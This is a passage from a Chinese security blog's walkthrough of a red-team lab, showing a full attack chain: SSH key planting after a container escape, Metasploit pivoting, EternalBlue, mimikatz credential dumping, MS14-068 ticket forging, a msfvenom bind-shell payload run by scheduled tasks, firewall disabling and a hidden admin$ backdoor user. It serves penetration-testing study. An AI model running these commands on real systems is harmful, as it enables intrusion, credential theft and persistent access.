AAAAB3NzaC1yc2EAAAADAQABAAABgQDDORcKgiXbVHiYu4CdE4KVZRKXZ/HAoowMB72vNdtT4VVzpbRnTlL/k0WfxntR8vowfAqlbM0nSZlXcwFKX+muzJxp0Pu+Wpax+TGDU1vDusdPvhYGPsohRBDpTWpWuPXAF65TnRNInhp7e+RAQ65yDweKl2Xs5qV82eI2TtGLxJ7hTPyTW3t1VGs3HV2BK0Krbv72BUEafY7AfID80wMGXiBLmuFiAL4mc7RhpirkDhcG8rwXvKQCS8JWF/8XjXOwUVCA70BCK5D51MD4qDBW7CwMJmhwO/e3aEzrqnpDkk6o9Ae2ef9VAvS5fGphSmnLvxzTbCnhq6cvGWzqNsxJoTmZPNQv7lxKN1wi02Ru9mlZPAR/futl4xJcaC4h99fFa6Ig8rJo8ZjXyNHu2R3oWC42FooMZANYzw2EOh2DR432LkwS5fxpoaKvzuli9ujjBXnD3x7e0LWMBya92Qz8VnGgjQdbADhpLNoo0qWK9Jt0leun51z5jCasvWlsCAs= root@kali' &gt; /tmptest/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>然后再使用ssh连接ubuntu即可，到此我们才真正意义上拿到了ubuntu的webshell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i tmptest ubuntu@192.168.111.129</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913161148243.png" alt="image-20230913161148243" style="zoom:67%;">
+
+<p>拿到<strong>Ubuntu</strong>真正的<strong>shell</strong></p>
+<h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><p>之前的方法上线<strong>msf</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913161828915.png" alt="image-20230913161828915" style="zoom:67%;">
+
+
+
+<h4 id="内网存活探测"><a href="#内网存活探测" class="headerlink" title="内网存活探测"></a>内网存活探测</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.111 255.255.255.0 1</span><br><span class="line">route print</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913172548660.png" alt="image-20230913172548660" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913173239577.png" alt="image-20230913173239577" style="zoom:67%;">
+
+<p>这里使用kali里面的<code>udp_probe</code>模块，速度较快</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.183.1-255</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913173453848.png" alt="image-20230913173453848" style="zoom:67%;">
+
+<p>探测到<code>192.168.183.130</code>和<code>192.168.183.134</code>两台机器，这里注意到130开了一个53端口，这里初步判断130为域控</p>
+<h4 id="永恒之蓝尝试"><a href="#永恒之蓝尝试" class="headerlink" title="永恒之蓝尝试"></a>永恒之蓝尝试</h4><p>这里直接上手永恒之蓝先打一波，这里实战的话最好先扫描，因为直接打的话可能会打蓝屏，这里是靶场的原因我就直接上手打了。之前提到过<strong>130</strong>开了<strong>53</strong>端口初步判断为域控，所以这里先从<strong>134</strong>这台主机入手</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.183.134</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230913200923005.png" alt="image-20230913200923005" style="zoom:67%;">
+
+<p>只前一直上线不了，后面尝试就成功了。不知道为什么，几台机器的IP一直在变，现在打进去的<strong>172</strong>是<strong>win7</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921132419316.png" alt="image-20230921132419316" style="zoom:67%;">
+
+<p>拿到的shell是一个<strong>system</strong>权限，看到wp上说要进行一个进程迁移，迁移到<strong>x64</strong>的进程上去，但是我寻思这个就是x64的进程啊,所以就没有移</p>
+<p>然后开启一个windows环境下的cmd进行信息搜集</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001     将控制台的代码页更改为 UTF-8 字符集,可以确保控制台能够正确地处理和显示 UTF-8 编码的文本信息</span><br><span class="line">net user</span><br><span class="line">net view /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>可以看到这里是在DEMO这个域环境里面</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921133356182.png" alt="image-20230921133356182" style="zoom:67%;">
+
+<p>ping一下130，能够ping通</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921133538954.png" alt="image-20230921133538954" style="zoom:67%;">
+
+<h4 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/bamboo/桌面/mimikatz-master/x64/ C:\\</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将<code>mimikatz</code>上传到靶机上</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921165308761.png" alt="image-20230921165308761" style="zoom:67%;">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921165911225.png" alt="image-20230921165911225" style="zoom:67%;">
+
+<p>提示提权不够无法提取</p>
+<p>使用exit回到<strong>meterpreter</strong>里面使用令牌窃取<strong>SYSTEM</strong>权限之后再进行<strong>mimikatz</strong>密码进行抓取</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">impersonate_token "NT AUTHORITY\SYSTEM"</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921170952452.png" alt="image-20230921170952452" style="zoom:67%;">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功抓取到密码</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921171313204.png" alt="image-20230921171313204" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921171235980.png" alt="image-20230921171235980" style="zoom:67%;">
+
+
+
+
+
+<h4 id="域横向移动"><a href="#域横向移动" class="headerlink" title="域横向移动"></a>域横向移动</h4><h5 id="利用Kerberos-域用户提权漏洞获得域控WIN2008"><a href="#利用Kerberos-域用户提权漏洞获得域控WIN2008" class="headerlink" title="利用Kerberos 域用户提权漏洞获得域控WIN2008"></a>利用Kerberos 域用户提权漏洞获得域控WIN2008</h5><p>拿到了域成员的帐号和密码后，直接使用一个<strong>ptt</strong>伪造票据来拿到域控权限，利用<strong>mimikatz</strong>注入票据。 </p>
+<p> 生成一个高权限票据：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">ms14-068.exe -u douser@DEMO.COM -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922152504491.png" alt="image-20230922152504491" style="zoom:67%;">
+
+<p>在注入之前先查看注入前的权限，此时发现权限不够</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921212011213.png" alt="image-20230921212011213" style="zoom:67%;">
+
+<p>清除内存中的所有票据：</p>
+<p>打开mimikatz</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">当看到"Ticket(s) purge for current session is OK'时，表示清除成功</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921212456107.png" alt="image-20230921212456107" style="zoom:67%;">
+
+<p>将高权限的票据注入内存：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br><span class="line">kerberos::ptc "TGT_user1@pentest.com.ccache"（双引号里面的是票据的名字）</span><br><span class="line">kerberos::ptc "TGT_douser@DEMO.com.ccache"</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921212756129.png" alt="image-20230921212756129" style="zoom:67%;">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921213732131.png" alt="image-20230921213732131" style="zoom:67%;">
+
+<p>注入票据后再次查看权限，能够成功的查取</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921213839688.png" alt="image-20230921213839688" style="zoom:67%;">
+
+<p>能够成功的查看另一台主机<code>Windows server2008</code>的目录信息</p>
+<h5 id="上传msf马到域控"><a href="#上传msf马到域控" class="headerlink" title="上传msf马到域控"></a>上传msf马到域控</h5><p>在<strong>kali</strong>中生成一个正向连接的木马文件，上传到<code>Windows server2008</code>中</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lhost=192.168.111.128 lport=9900 -f exe &gt; 9900.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922153512474.png" alt="image-20230922153512474" style="zoom:67%;">
+
+<p>由于无法直接访问主机Windows server2008，先上传到win7中</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/bamboo/桌面/9900.exe C:\\</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922154348709.png" alt="image-20230922154348709" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922155011082.png" alt="image-20230922155011082" style="zoom:67%;">
+
+<p>再通过win7上传到Windows server 2008中</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922160002791.png" alt="image-20230922160002791" style="zoom:67%;">
+
+
+
+<p>木马上传成功后，创建服务执行木马文件，并用msf接受会话</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922163721242.png" alt="image-20230922163721242" style="zoom:67%;">
+
+<p>复现时遇到报错</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922163801315.png" alt="image-20230922163801315" style="zoom:67%;">
+
+<p>发现我的配置文件有两个，一个<code>/etc/proxychains.conf</code>，一个<code>/etc/proxychains4.conf</code>，查了一下，<strong>proxychains</strong>4以上的版本的配置文件名叫<code>/etc/proxychains4.conf</code>，于是把<code>/etc/proxychains.conf</code>删了，解决</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.130</span><br><span class="line">set lport 9900</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>使用copy命令复制到DC上后使用sc创建计划任务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn "test" /tr C:\Users\Desktop\9900.exe /sc MINUTE /S 192.168.183.130</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922164655525.png" alt="image-20230922164655525" style="zoom: 67%;">
+
+<p>使用sc关闭防火墙</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= "netsh advfirewall set allprofiles state off"</span><br><span class="line">sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922164710579.png" alt="image-20230922164710579" style="zoom:67%;">
+
+<p>创建服务站执行msf马</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /S WIN-ENS2VR5TR3N /TN "test1" /TR C:\9900.exe /SC MINUTE /MO 1 /ru system /f /RP</span><br><span class="line"></span><br><span class="line">echo netsh advfirewall set allprofiles state off &gt;1.bat</span><br><span class="line">copy C:\\1.bat \\WIN-ENS2VR5TR3N\c$\</span><br><span class="line">schtasks /create /S WIN-ENS2VR5TR3N /TN "test2" /TR C:\1.bat /SC MINUTE /MO 1 /ru system /f /RP</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922171752234.png" alt="image-20230922171752234" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922171648746.png" alt="image-20230922171648746" style="zoom:67%;">
+
+<p><strong>msf</strong>收到shell</p>
+<h5 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h5><p>上面查看系统信息发现这台主机也没有打KB3011780的补丁，上传mimikatz进行抓取密码</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922172139657.png" alt="image-20230922172139657" style="zoom:67%;">
+
+<p>可以看到<strong>mimikatz</strong>被上传</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922172224094.png" alt="image-20230922172224094" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922172429713.png" alt="image-20230922172429713" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922173750611.png" alt="image-20230922173750611" style="zoom:67%;">
+
+<p>密码：Test2023</p>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>这里拿到域管用户之后可以使用金票进行权限维持，这里我就简单的添加一个隐藏用户进行权限维持,再使用<code>net user</code>是看不到这个隐藏用户的</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ qaz123!@# /add		#添加用户admin$</span><br><span class="line">net localgroup administrators admin$ /add	#将admin$用户添加到管理员组administrators</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922174621344.png" alt="image-20230922174621344" style="zoom:67%;"></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/">http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img class="cover" src="/DC2%20&amp;%20DC3/image-20230717104511424.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DC1 &amp; DC3</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">红日靶场二</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">热爱学习，分享技术</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Bamboo的博客！原博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B"><span class="toc-number">1.</span> <span class="toc-text">ATT&amp;CK红队评估四</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web"><span class="toc-number">1.1.1.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DC"><span class="toc-number">1.1.2.</span> <span class="toc-text">DC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#win7"><span class="toc-number">1.1.3.</span> <span class="toc-text">win7</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">一、信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87IP"><span class="toc-number">1.2.1.</span> <span class="toc-text">探测目标IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.2.</span> <span class="toc-text">探测开放端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E7%AB%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">web端信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Struts2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Struts2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">Tomcat 任意文件上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8"><span class="toc-number">1.3.1.</span> <span class="toc-text">docker逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#privileged%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">1.3.2.</span> <span class="toc-text">privileged特权模式逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="toc-number">1.3.3.</span> <span class="toc-text">上线msf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">内网存活探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%B0%9D%E8%AF%95"><span class="toc-number">1.3.5.</span> <span class="toc-text">永恒之蓝尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.6.</span> <span class="toc-text">获取密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.3.7.</span> <span class="toc-text">域横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Kerberos-%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7WIN2008"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">利用Kerberos 域用户提权漏洞获得域控WIN2008</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0msf%E9%A9%AC%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">上传msf马到域控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">mimikatz抓取密码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.3.8.</span> <span class="toc-text">权限维持</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC4 &amp; DC5"></a><div class="content"><a class="title" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5">DC4 &amp; DC5</a><time datetime="2024-01-23T09:30:58.103Z" title="发表于 2024-01-23 17:30:58">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网信息搜集"></a><div class="content"><a class="title" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集">内网信息搜集</a><time datetime="2024-01-23T09:30:12.000Z" title="发表于 2024-01-23 17:30:12">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img src="/DC2%20&amp;%20DC3/image-20230717104511424.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC1 &amp; DC3"></a><div class="content"><a class="title" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3">DC1 &amp; DC3</a><time datetime="2024-01-23T09:28:25.268Z" title="发表于 2024-01-23 17:28:25">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" 